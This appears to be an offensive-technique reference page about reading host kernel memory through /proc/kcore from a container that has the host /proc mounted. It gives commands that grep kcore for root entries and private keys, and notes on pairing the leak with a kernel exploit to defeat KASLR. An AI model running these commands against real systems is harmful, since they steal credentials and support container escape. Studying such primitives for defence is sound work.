---
title: "kcore: reading host kernel memory from a container"
description: "Reading /proc/kcore from a container with a host /proc mounted to dump live host kernel memory, recovering secrets and kernel addresses and defeating KASLR to support a follow-on kernel exploit."
keywords:
  - /proc/kcore
  - kernel memory read
  - KASLR bypass
  - procfs escape
  - container escape
---

# kcore memory read

`/proc/kcore` is a virtual file that maps live kernel memory in ELF core format. Reading it exposes the running host kernel: secrets in kernel buffers, credential structures, and the kernel's load addresses. It is a read primitive rather than direct execution, but it defeats KASLR and feeds a follow-on kernel exploit, and it leaks data that supports other escapes.

```bash
# Available when the host /proc is mounted in and the container can read kcore
ls -l /proc/kcore
strings -n 12 /proc/kcore | grep -i 'root:\|BEGIN PRIVATE KEY' | head

# Parse ELF program headers to map and read specific kernel virtual addresses
python3 - <<'PY'
import struct
f=open('/proc/kcore','rb'); f.read(64)  # ELF header, then program headers follow
print('kcore readable:', f.readable())
PY
```

## Exploitation notes

- The value is kernel addresses (to break KASLR) and in-memory secrets; pair it with a [kernel exploit](../../runtime-and-kernel-exploits/kernel-exploits/index.md) that needs a leaked address.
- A default container masks `/proc/kcore`; the primitive needs the host `/proc` mounted or an unmasked one in a privileged container.
- Reads are of live memory, so offsets shift; locate structures by signature rather than fixed addresses.

## References

- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
- [Kernel: KASLR](https://www.kernel.org/doc/html/latest/admin-guide/kernel-parameters.html)
